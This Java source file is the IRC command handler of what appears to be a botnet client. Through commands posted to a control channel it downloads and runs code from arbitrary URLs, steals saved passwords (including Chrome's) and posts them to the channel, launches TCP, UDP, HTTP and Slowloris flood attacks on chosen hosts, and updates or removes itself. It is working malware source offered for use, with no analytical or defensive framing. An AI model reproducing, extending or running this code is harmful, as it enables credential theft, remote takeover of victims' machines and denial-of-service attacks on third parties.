package com.elementiumdev.irc;

import java.util.Locale;
import java.util.Random;

import org.jibble.pircbot.PircBot;

import com.elementiumdev.recovery.RecoveryManager;
import com.elementiumdev.util.Constants;
import com.elementiumdev.util.Functions;

public class Handler extends PircBot {
	
	public static String UID = "";

	public Handler() {
		newName();
	}
	
	public void newName() {
		this.setName("[" + Locale.getDefault().getCountry() + "|" + System.getProperty("os.name").replaceAll(" ", "").replaceAll(".", "-") + "]" + Functions.generateString(new Random(), "abc1234567890", 4));
	}
	
	/*public void onDisconnect() {
		try {
			this.reconnect();
		} catch (NickAlreadyInUseException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (IrcException e) {
			e.printStackTrace();
		}
	}*/
	
	public void onMessage(String channel, String sender, String login, String hostname, String message) {
		if(channel.equalsIgnoreCase(Constants.CHANNEL)) {
			if(message.startsWith(Constants.PREFIX)) {
				message = message.replace(Constants.PREFIX, "");
				message = message.trim();
				
				String[] m = message.split(" ");
				if(m[0].equalsIgnoreCase("help")) {
					String pf = Constants.PREFIX;
					sM(pf + "dlexec URL");
					sM(pf + "passwords <all/BOT_UID>");
					sM(pf + "stress <TCP/UDP/HTTP/Slowlorris> HOST PORT THREADS DELAY TIME");
					sM(pf + "update URL");
					sM(pf + "uninstall");
					sM(pf + "stop");
					sM(pf + "visit URL");
				} else if(m[0].equalsIgnoreCase("passwords")) {
					if(m.length >= 2) {
						if(m[1].equalsIgnoreCase("all") || m[1].equalsIgnoreCase(UID)) {
							for(String s : Functions.recoverPasswords()) {
								if(!s.equalsIgnoreCase("")) {
									sM(s);
								}
							}
						}
					} else {
						sM("Missing parameters. Correct usage: " + Constants.PREFIX + "passwords <all/BOT_UID>");
					}
					
				} else if(m[0].equalsIgnoreCase("dlexec")) {
					if(m.length >= 2) {
						try {
							Functions.download(m[1]);
						} catch (Exception e) {
							e.printStackTrace();
						}
					} else {
						sM("Missing parameters. Correct usage: " + Constants.PREFIX + "dlexec <url>");
					}
				} else if(m[0].equalsIgnoreCase("stress")) {
					if(m.length >= 7) {
						String type = m[1];
						String host = m[2];
						int port = 80;
						
						try {
							port = Integer.parseInt(m[3]);
						} catch (NumberFormatException e) {
							
							this.sendMessage(Constants.CHANNEL, "Port invalid.");
						}
						
						int threads = 4;
						
						try {
							threads = Integer.parseInt(m[4]);
						} catch (NumberFormatException e) {
							
							this.sendMessage(Constants.CHANNEL, "Threads invalid.");
						}
						
						int delay = 10;
						
						try {
							delay = Integer.parseInt(m[5]);
						} catch (NumberFormatException e) {
							
							this.sendMessage(Constants.CHANNEL, "Delay invalid.");
						}
						
						long time = System.currentTimeMillis()+(60*1000);
						
						try {
							Functions.startStress(type, host, port, threads, delay, time);
						} catch (Exception e) {
							
							for(StackTraceElement ste : e.getStackTrace()) {
								this.sendMessage(Constants.CHANNEL, ste.toString());
							}
						}
					} else {
						sM("Missing parameters. Correct usage: " + Constants.PREFIX + "stress <tcp/udp/slowlorris/http> <host> <port> <threads> <delay/freq> <duration>");
					}
				} else if(m[0].equalsIgnoreCase("uninstall")) {
					sM("Uninstalling... Goodbye.");
					try {
						Thread.sleep(250);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
					Functions.uninstall();
				} else if(m[0].equalsIgnoreCase("update")) {
					if(m.length >= 2) {
						Functions.update(m[1]);
					} else {
						sM("Missing parameters. Correct usage: " + Constants.PREFIX + "update <url>");
					}
				} else if(m[0].equalsIgnoreCase("stop")) {
					System.exit(0);
				} else if(m[0].equalsIgnoreCase("visit")) {
					if(m.length >= 2) {
						Functions.visit(m[1]);
					} else {
						sM("Missing parameters. Correct usage: " + Constants.PREFIX + "visit <url>");
					}
				} else if(m[0].equalsIgnoreCase("echo")) {
					sM(message);
				} else if(m[0].equalsIgnoreCase("passwds")) {
					String[][] passwds = RecoveryManager.recover();
					String[] chrome = passwds[0];
					for(String s : chrome) {
						sM("[CHROME]"+s);
					}
				}
			}
		}
	}
	
	public static void sM(String s) {
		IRC.h.sendMessage(Constants.CHANNEL, s);
	}
	
	
}
